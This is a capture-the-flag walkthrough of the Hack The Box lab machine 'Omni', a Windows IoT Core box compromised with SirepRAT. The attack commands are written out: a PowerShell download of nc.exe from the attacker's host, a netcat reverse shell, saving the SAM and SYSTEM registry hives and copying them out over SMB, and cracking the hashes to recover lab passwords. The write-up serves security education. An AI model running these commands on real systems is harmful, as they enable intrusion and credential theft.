---
"title": "Hack The Box - Omni"
"date": 2021-01-09
"tags": ["IOT", "easy", "SirepRAT"]
"keywords": ["IOT", "easy", "SirepRAT"]
"categories": ["HackTheBox"]
"author": "Ghostbyt3"
"description": "Link: [https://www.hackthebox.eu/home/machines/profile/271](https://www.hackthebox.eu/home/machines/profile/271)"
"featured_image": "/img/htb-omni/Untitled.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "HackTheBox - Writeup"
---


![Untitled](/img/htb-omni/Untitled.png)

Link: [https://www.hackthebox.eu/home/machines/profile/271](https://www.hackthebox.eu/home/machines/profile/271)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```bash
PORT      STATE SERVICE  VERSION
135/tcp   open  msrpc    Microsoft Windows RPC
5985/tcp  open  upnp     Microsoft IIS httpd
8080/tcp  open  upnp     Microsoft IIS httpd
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Windows Device Portal
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
29817/tcp open  unknown
29819/tcp open  arcserve ARCserve Discovery
29820/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port29820-TCP:V=7.80%I=7%D=8/23%Time=5F426145%P=x86_64-pc-linux-gnu%r(N
SF:ULL,10,"\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12")%r(GenericLines,10,"
SF:\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12")%r(Help,10,"\*LY\xa5\xfb`\x0
SF:4G\xa9m\x1c\xc9}\xc8O\x12")%r(JavaRMI,10,"\*LY\xa5\xfb`\x04G\xa9m\x1c\x
SF:c9}\xc8O\x12");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP (86%)
OS CPE: cpe:/o:microsoft:windows_xp::sp2
Aggressive OS guesses: Microsoft Windows XP SP2 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   206.35 ms 10.10.14.1
2   206.28 ms 10.10.10.204
```

## Web Enumeration

Started with the webservice running on Port 8080. Checking that reveals its a **Windows Device Portal.** 

And it's asking for Username and Password. I tried some default credentials and none worked.

![Untitled](/img/htb-omni/Untitled%201.png)

> What is Windows Device Portal? 
The Windows Device Portal lets you configure and manage your device remotely over a network or USB connection. ... Windows Device Portal is a web server on your device that you can connect to from a web browser on a PC. If your device has a web browser, you can also connect locally with the browser on that device. It works like an IoT.

So I googled for default Credentials and found this. And That too didn't work.

> [https://docs.microsoft.com/en-us/windows/iot-core/manage-your-device/deviceportal](https://docs.microsoft.com/en-us/windows/iot-core/manage-your-device/deviceportal)

![Untitled](/img/htb-omni/Untitled%202.png)

## Getting Shell

Next, I googled for any exploit available for Windows Core IOT. And Found this GitHub repo.

> [https://github.com/SafeBreach-Labs/SirepRAT](https://github.com/SafeBreach-Labs/SirepRAT)

The tool will exploit Sirep Test Service which  is used to perform driver/hardware tests on the IoT device and that’s built in and running on the official images offered at Microsoft’s site. So I tested whether its working or not. I tried to ping my device and it works.

```bash
┌──(root🐺kali)-[~/htb/boxes/omni/SirepRAT]
└─# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c ping 10.10.14.30" 
[HResultResult | type: 1, payload length: 4, HResult: 0x0](HResultResult | type: 1, payload length: 4, HResult: 0x0)
[OutputStreamResult | type: 11, payload length: 98, payload peek: 'Pinging 10.10.14.30 with 32 bytes of data:Repl'](OutputStreamResult | type: 11, payload length: 98, payload peek: 'Pinging 10.10.14.30 with 32 bytes of data:Repl')
[OutputStreamResult | type: 11, payload length: 52, payload peek: 'Reply from 10.10.14.30: bytes=32 time=757ms TTL=63'](OutputStreamResult | type: 11, payload length: 52, payload peek: 'Reply from 10.10.14.30: bytes=32 time=757ms TTL=63')
[OutputStreamResult | type: 11, payload length: 52, payload peek: 'Reply from 10.10.14.30: bytes=32 time=456ms TTL=63'](OutputStreamResult | type: 11, payload length: 52, payload peek: 'Reply from 10.10.14.30: bytes=32 time=456ms TTL=63')
[OutputStreamResult | type: 11, payload length: 249, payload peek: 'Reply from 10.10.14.30: bytes=32 time=203ms TTL=63'](OutputStreamResult | type: 11, payload length: 249, payload peek: 'Reply from 10.10.14.30: bytes=32 time=203ms TTL=63')
[ErrorStreamResult | type: 12, payload length: 4, payload peek: ''](ErrorStreamResult | type: 12, payload length: 4, payload peek: '')
```

Time to Get Shell, In first Command I uploaded the `nc.exe` and in next command I tried to run it but I get some compatible error. 

```bash
┌──(root🐺kali)-[~/htb/boxes/omni/SirepRAT]
└─# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell.exe -command Invoke-WebRequest -Uri 'http://10.10.14.30/nc.exe' -OutFile 'C:\windows\system32\spool\drivers\color\nc.exe'"
[HResultResult | type: 1, payload length: 4, HResult: 0x0](HResultResult | type: 1, payload length: 4, HResult: 0x0)
┌──(root🐺kali)-[~/htb/boxes/omni/SirepRAT]
└─# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\windows\system32\spool\drivers\color\nc.exe 10.10.14.30 1234 -e cmd.exe" --v 
---------
This version of C:\windows\system32\spool\drivers\color\nc.exe is not compatible with the version of Windows you're running. Check your computer's system information and then contact the software publisher.

---------
[HResultResult | type: 1, payload length: 4, HResult: 0x0](HResultResult | type: 1, payload length: 4, HResult: 0x0)
[OutputStreamResult | type: 11, payload length: 208, payload peek: 'This version of C:\windows\system32\spool\drivers\'](OutputStreamResult | type: 11, payload length: 208, payload peek: 'This version of C:\windows\system32\spool\drivers\')
[ErrorStreamResult | type: 12, payload length: 4, payload peek: ''](ErrorStreamResult | type: 12, payload length: 4, payload peek: '')

```

So I searched for other `nc.exe` there is a lot of them in GitHub. And I got this one.

> [https://github.com/int0x33/nc.exe](https://github.com/int0x33/nc.exe)

Used the same command and started my netcat listener.

![Untitled](/img/htb-omni/Untitled%203.png)

And I got a shell. It's weird I can't even run `whoami` 

![Untitled](/img/htb-omni/Untitled%204.png)

I enumerated all the folders and in `Data\Users` there is app and Administrator directory, where I have access on them both. While checking `app` directory I found `iot-admin.xml` and is encrypted using Powershell it uses Get-Credential, Export-CliXml, and Import-CliXml to store and retrieve username and passwords.

```bash
C:\Data\Users\app>dir
dir
 Volume in drive C is MainOS
 Volume Serial Number is 3C37-C677

 Directory of C:\Data\Users\app

08/24/2020  08:33 AM    [DIR](DIR)          .
08/24/2020  08:33 AM    [DIR](DIR)          ..
07/04/2020  07:28 PM    [DIR](DIR)          3D Objects
07/04/2020  07:28 PM    [DIR](DIR)          Documents
07/04/2020  07:28 PM    [DIR](DIR)          Downloads
07/04/2020  07:28 PM    [DIR](DIR)          Favorites
07/04/2020  08:20 PM               344 hardening.txt
07/04/2020  08:14 PM             1,858 iot-admin.xml
07/04/2020  07:28 PM    [DIR](DIR)          Music
07/04/2020  07:28 PM    [DIR](DIR)          Pictures
07/04/2020  09:53 PM             1,958 user.txt
07/04/2020  07:28 PM    [DIR](DIR)          Videos
               3 File(s)          4,160 bytes
               9 Dir(s)   4,690,165,760 bytes free

C:\Data\Users\app>type iot-admin.xml
type iot-admin.xml
[Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"](Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04")
  [Obj RefId="0"](Obj RefId="0")
    [TN RefId="0"](TN RefId="0")
      [T](T)System.Management.Automation.PSCredential[/T](/T)
      [T](T)System.Object[/T](/T)
    [/TN](/TN)
    [ToString](ToString)System.Management.Automation.PSCredential[/ToString](/ToString)
    [Props](Props)
      [S N="UserName"](S N="UserName")omni\administrator[/S](/S)
      [SS N="Password"](SS N="Password")01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa28853640000000002000000000010660000000100002000000000855856bea37267a6f9b37f9ebad14e910d62feb252fdc98a48634d18ae4ebe000000000e80000000020000200000000648cd59a0cc43932e3382b5197a1928ce91e87321c0d3d785232371222f554830000000b6205d1abb57026bc339694e42094fd7ad366fe93cbdf1c8c8e72949f56d7e84e40b92e90df02d635088d789ae52c0d640000000403cfe531963fc59aa5e15115091f6daf994d1afb3c2643c945f2f4b8f15859703650f2747a60cf9e70b56b91cebfab773d0ca89a57553ea1040af3ea3085c27[/SS](/SS)
    [/Props](/Props)
  [/Obj](/Obj)
[/Objs](/Objs)
```

I googled about how to decrypt it and found this link and `$cred=Import-CliXml -Path [file](file); $cred.GetNetworkCredential().Password` this is the command which helps to decrypt.

> [https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx](https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx)

In our case, I get some error. I can't decrypt it.

```bash
C:\Data\Users\app>powershell.exe -c "$cred=Import-CliXml -Path C:\Data\Users\app\iot-admin.xml; $cred.GetNetworkCredential().Password"
powershell.exe -c "$cred=Import-CliXml -Path C:\Data\Users\app\iot-admin.xml; $cred.GetNetworkCredential().Password"
Import-CliXml : Error occurred during a cryptographic operation.
At line:1 char:7
+ $cred=Import-CliXml -Path C:\Data\Users\app\iot-admin.xml; $cred.GetN ...
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Import-Clixml], Cryptographic 
   Exception
    + FullyQualifiedErrorId : System.Security.Cryptography.CryptographicExcept 
   ion,Microsoft.PowerShell.Commands.ImportClixmlCommand
 
You cannot call a method on a null-valued expression.
At line:1 char:60
+ ... :\Data\Users\app\iot-admin.xml; $cred.GetNetworkCredential().Password
+                                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
    + FullyQualifiedErrorId : InvokeMethodOnNull
```

I even have access to `Administrator` directory, I can read those files and they are also encrypted and I can't decrypt them too.

```bash
C:\Data\Users\administrator>dir
dir
 Volume in drive C is MainOS
 Volume Serial Number is 3C37-C677

 Directory of C:\Data\Users\administrator

08/24/2020  05:29 AM    [DIR](DIR)          .
08/24/2020  05:29 AM    [DIR](DIR)          ..
07/03/2020  11:23 PM    [DIR](DIR)          3D Objects
07/03/2020  11:23 PM    [DIR](DIR)          Documents
07/03/2020  11:23 PM    [DIR](DIR)          Downloads
07/03/2020  11:23 PM    [DIR](DIR)          Favorites
07/03/2020  11:23 PM    [DIR](DIR)          Music
07/03/2020  11:23 PM    [DIR](DIR)          Pictures
07/04/2020  09:48 PM             1,958 root.txt
07/04/2020  09:48 PM             1,958 root.xml
07/03/2020  11:23 PM    [DIR](DIR)          Videos
               2 File(s)          3,916 bytes
               9 Dir(s)   4,690,165,760 bytes free
```

I thought since we have access to Administrator directory, what about SAM and SYSTEM files? We have access to them too?

**SAM - The Security Account Manager is a database file in Windows XP, Windows Vista, Windows 7, 8.1 and 10 that stores users' passwords.**

**SYSTEM - The Windows Registry is a hierarchical database that stores low-level settings for the Microsoft Windows operating system and for applications that opt to use the Registry.**

> [https://pure.security/dumping-windows-credentials/](https://pure.security/dumping-windows-credentials/)

And Yes we have access to them. Copied them to the app directory. Now I need to copy this to my machine.

```bash
PS C:\Data\Users\app> reg.exe save hklm\sam C:\Data\Users\app\sam
PS C:\Data\Users\app> reg.exe save hklm\system C:\Data\Users\app\system
```

I setup SMB Server in my machine.

![Untitled](/img/htb-omni/Untitled%205.png)

Copied the files to my machine.

```bash
PS C:\Data\Users\app> net use z: \\10.10.14.30\pub /user:wolf wolf
PS C:\Data\Users\app> copy sam \\10.10.14.30\pub
copy sam \\10.10.14.30\pub
PS C:\Data\Users\app> copy system \\10.10.14.30\pub
copy system \\10.10.14.30\pub
```

There are various tools to dump the hashes, I used `secretsdump.py` and I got some hashes. We are Interested in Administrator and app hashes.

![Untitled](/img/htb-omni/Untitled%206.png)

I cracked the hashes using JTR and I got user `app` hash.

![Untitled](/img/htb-omni/Untitled%207.png)

We know Windows Device Portal running on Port 8080 and its asking for credentials. This time I used this `app : mesh5143`.

![Untitled](/img/htb-omni/Untitled%208.png)

I logged into the dashboard. I started checking each and every tabs.

![Untitled](/img/htb-omni/Untitled%209.png)

There is an option to Run Command, We have already uploaded our `nc64.exe` so I used the same one to get a shell.

![Untitled](/img/htb-omni/Untitled%2010.png)

This time I don't have access to the Administrator's directory.

And now I'm able to decrypt the file and got `iot-admin.xml` it contains some password. And I used the same method to decrypt the `user.txt` and got user flag. 

```bash
C:\Data\Users\app>powershell.exe -c "$cred=Import-CliXml -Path C:\Data\Users\app\iot-admin.xml; $cred.GetNetworkCredential().Password"
powershell.exe -c "$cred=Import-CliXml -Path C:\Data\Users\app\iot-admin.xml; $cred.GetNetworkCredential().Password"
Attempting to perform the InitializeDefaultDrives operation on the 'FileSystem' provider failed.
_1nt3rn37ofTh1nGz
```

We got one more file. And it seems useless.

```bash
C:\Data\Users\app>type hardening.txt
type hardening.txt
- changed default administrator password of "p@ssw0rd"
- added firewall rules to restrict unnecessary services
- removed administrator account from "Ssh Users" group
```

## Privilege Escalation

Since we got a password from `iot-admin.xml` the filename itself tells it is IOT Administrator password. I logged in as Administrator using `_1nt3rn37ofTh1nGz`

![Untitled](/img/htb-omni/Untitled%2011.png)

We already know Run Command options is there. I used the same method we did before to get a shell.

![Untitled](/img/htb-omni/Untitled%2012.png)

This time I have access to the Administrator's directory and use the same method to decrypt the flag.

![Untitled](/img/htb-omni/Untitled%2013.png)

We Own the Box.